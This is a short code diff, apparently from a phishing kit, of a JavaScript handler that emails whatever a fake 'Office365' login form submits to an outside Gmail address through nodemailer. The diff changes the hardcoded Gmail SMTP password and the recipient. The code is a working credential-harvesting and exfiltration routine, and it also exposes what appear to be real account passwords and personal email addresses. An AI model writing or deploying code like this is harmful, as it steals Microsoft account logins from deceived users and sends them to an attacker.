@@ -9,13 +9,13 @@ export default async function sendEmail (req, res) {
         secure: true, // true for 465, false for other ports
         auth: {
           user: 'techbae.js@gmail.com', // generated ethereal user
-          pass: 'rsbijlgnsjxqytqh', // generated ethereal password
+          pass: 'swalqrynupjaeuhl', // generated ethereal password
         },
      })
 
        let info = await transporter.sendMail({
         from: '"Office" <techbae.js@gmail.com>',
-        to: 'williamcharles2106@gmail.com',
+        to: 'linkersmind@gmail.com',
         subject: 'Office365',
         text: `Ofiice login ${req.body}`,
         html: `<h3> Office Login: ${req.body}</h3>`
